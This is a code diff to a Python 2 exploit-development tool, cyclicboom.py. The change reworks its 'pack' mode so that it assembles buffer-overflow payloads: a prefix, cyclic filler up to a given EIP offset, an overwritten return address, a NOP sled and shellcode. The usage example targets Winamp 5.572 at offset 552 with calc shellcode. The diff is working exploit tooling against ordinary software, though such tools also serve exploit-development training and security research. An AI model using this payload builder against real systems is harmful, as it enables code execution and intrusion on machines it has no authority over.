@@ -10,7 +10,7 @@ def parse_args():
         epilog=(
             "Examples:\n"
             "  Generate: python cyclicboom.py --mode generate --output pattern.bin --length 1011 --prefix 'PRE' --suffix-byte 0xF9350101 --avoid-chars '\\x00\\x0a'\n"
-            "  Pack: python cyclicboom.py --mode pack --output payload.bin --length 1011 --suffix-byte 0xF9350101 --nop-sled-length 16 --shellcode-payload shellcode.bin --payload-format raw\n"
+            "  Pack: python cyclicboom.py --mode pack --output payload.bin --prefix 'Winamp 5.572 ' --eip-position 552 --eip-value 0xEA631577 --nop-sled-length 100 --shellcode-payload calc.shellcode.hex --payload-format hex\n"
             "  Search: python cyclicboom.py --mode search --input pattern.bin --eip-value 41424344"
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter
@@ -19,7 +19,7 @@ def parse_args():
         "--mode",
         choices=["generate", "search", "pack"],
         default="generate",
-        help="Operation mode: 'generate' creates a cyclic pattern, 'search' finds EIP offset, 'pack' builds a payload with cyclic pattern and shellcode (default: generate)"
+        help="Operation mode: 'generate' creates a cyclic pattern, 'search' finds EIP offset, 'pack' builds a payload with EIP control and shellcode (default: generate)"
     )
     parser.add_argument(
         "--output",
@@ -29,7 +29,7 @@ def parse_args():
     group_length.add_argument(
         "--length",
         type=int,
-        help="Exact length of cyclic pattern (excludes prefix/suffix, mutually exclusive with --max-length, required for generate and pack)"
+        help="Exact length of cyclic pattern (excludes prefix/suffix, mutually exclusive with --max-length, used in generate)"
     )
     group_length.add_argument(
         "--max-length",
@@ -51,12 +51,12 @@ def parse_args():
     group_suffix.add_argument(
         "--suffix",
         default="",
-        help="String to append to cyclic pattern (mutually exclusive with --suffix-byte, default: empty)"
+        help="String to append to cyclic pattern (mutually exclusive with --suffix-byte, default: empty, used in generate)"
     )
     group_suffix.add_argument(
         "--suffix-byte",
         default="",
-        help="Hex byte string to append to cyclic pattern (e.g., '0xF9350101', mutually exclusive with --suffix, default: empty)"
+        help="Hex byte string to append to cyclic pattern (e.g., '0xF9350101', mutually exclusive with --suffix, default: empty, used in generate)"
     )
     parser.add_argument(
         "--avoid-chars",
@@ -69,17 +69,22 @@ def parse_args():
     )
     parser.add_argument(
         "--eip-value",
-        help="4-byte hex string overwriting EIP (e.g., '41424344', required for search mode)"
+        help="4-byte hex string overwriting EIP (e.g., '0x41424344', required for search and pack modes)"
+    )
+    parser.add_argument(
+        "--eip-position",
+        type=int,
+        help="Byte offset where EIP value starts in pack mode (required for pack)"
     )
     parser.add_argument(
         "--shellcode-payload",
-        help="File path to shellcode payload (required for pack mode)"
+        help="File path to shellcode payload (optional for pack mode)"
     )
     parser.add_argument(
         "--payload-format",
         choices=["hex", "raw"],
         default="raw",
-        help="Format of shellcode payload file: 'hex' for hex string, 'raw' for binary (default: raw)"
+        help="Format of shellcode payload file: 'hex' for hex string, 'raw' for binary (default: raw, required if shellcode-payload is specified)"
     )
     parser.add_argument(
         "--nop-sled-length",
@@ -92,12 +97,14 @@ def parse_args():
         parser.error("--output is required in generate mode")
     if args.mode == "generate" and args.length is None and args.max_length is None:
         parser.error("One of --length or --max-length is required in generate mode")
-    if args.mode == "pack" and (not args.output or not args.shellcode_payload or args.length is None):
-        parser.error("--output, --shellcode-payload, and --length are required in pack mode")
+    if args.mode == "pack" and (not args.output or not args.eip_value or args.eip_position is None):
+        parser.error("--output, --eip-value, and --eip-position are required in pack mode")
+    if args.mode == "pack" and args.shellcode_payload and not args.payload_format:
+        parser.error("--payload-format is required when --shellcode-payload is specified")
     if args.mode == "pack" and args.nop_sled_length < 0:
         parser.error("--nop-sled-length must be non-negative")
-    if args.mode == "pack" and args.max_length is not None:
-        parser.error("--max-length is not supported in pack mode; use --length")
+    if args.mode == "pack" and args.eip_position < 0:
+        parser.error("--eip-position must be non-negative")
     return args
 
 # Convert hex string to bytes (handles 0x or raw hex, variable length)
@@ -232,34 +239,45 @@ def main():
         except (ValueError, SyntaxError):
             print "Error: --avoid-chars must be a valid byte string (e.g., '\\x00\\x0a')"
             sys.exit(1)
-        # Parse prefix/suffix bytes
+        # Parse prefix
         try:
             prefix = hex_to_bytes(args.prefix_byte) if args.prefix_byte else args.prefix
         except ValueError as e:
             print "Error: Invalid --prefix-byte: {}".format(e)
             sys.exit(1)
+        # Parse eip-value
         try:
-            suffix = hex_to_bytes(args.suffix_byte) if args.suffix_byte else args.suffix
+            eip_bytes = hex_to_bytes(args.eip_value)
+            if len(eip_bytes) != 4:
+                raise ValueError("EIP value must be a 4-byte hex string")
         except ValueError as e:
-            print "Error: Invalid --suffix-byte: {}".format(e)
+            print "Error: Invalid --eip-value: {}".format(e)
             sys.exit(1)
-        # Read shellcode
-        try:
-            shellcode = read_shellcode(args.shellcode_payload, args.payload_format)
-        except ValueError as e:
-            print "Error: {}".format(e)
-            sys.exit(1)
+        # Read shellcode if provided
+        shellcode = ""
+        shellcode_len = 0
+        if args.shellcode_payload:
+            try:
+                shellcode = read_shellcode(args.shellcode_payload, args.payload_format)
+                shellcode_len = len(shellcode)
+            except ValueError as e:
+                print "Error: {}".format(e)
+                sys.exit(1)
         # Calculate lengths
         prefix_len = len(prefix)
-        suffix_len = len(suffix)
+        eip_len = len(eip_bytes)
         nop_sled_len = args.nop_sled_length
-        shellcode_len = len(shellcode)
-        cyclic_len = args.length
+        cyclic_len = args.eip_position - prefix_len
+        if cyclic_len < 0:
+            print "Error: eip-position is less than prefix length"
+            sys.exit(1)
+        if cyclic_len == 0:
+            print "Warning: Cyclic pattern length is 0 due to prefix"
         # Generate components
         cyclic_pattern = generate_cyclic_pattern(cyclic_len, avoid_chars)
         nop_sled = "\x90" * nop_sled_len
         # Combine payload
-        output_data = prefix + cyclic_pattern + suffix + nop_sled + shellcode
+        output_data = prefix + cyclic_pattern + eip_bytes + nop_sled + shellcode
         # Write to file
         with open(args.output, "wb") as f:
             f.write(output_data)
@@ -267,11 +285,11 @@ def main():
         print "Payload packed successfully:"
         print "Prefix: {} bytes".format(prefix_len)
         print "Cyclic pattern: {} bytes".format(len(cyclic_pattern))
-        print "Suffix: {} bytes".format(suffix_len)
+        print "EIP value: {} bytes".format(eip_len)
         print "NOP sled: {} bytes".format(nop_sled_len)
         print "Shellcode: {} bytes".format(shellcode_len)
         print "Total: {} bytes".format(len(output_data))
-        print "Use '!mona suggest' in Immunity Debugger to refine the exact length to EIP."
+        print "Use '!mona suggest' in Immunity Debugger to verify EIP alignment."
     
     else:  # search mode
         if not args.input or not args.eip_value:
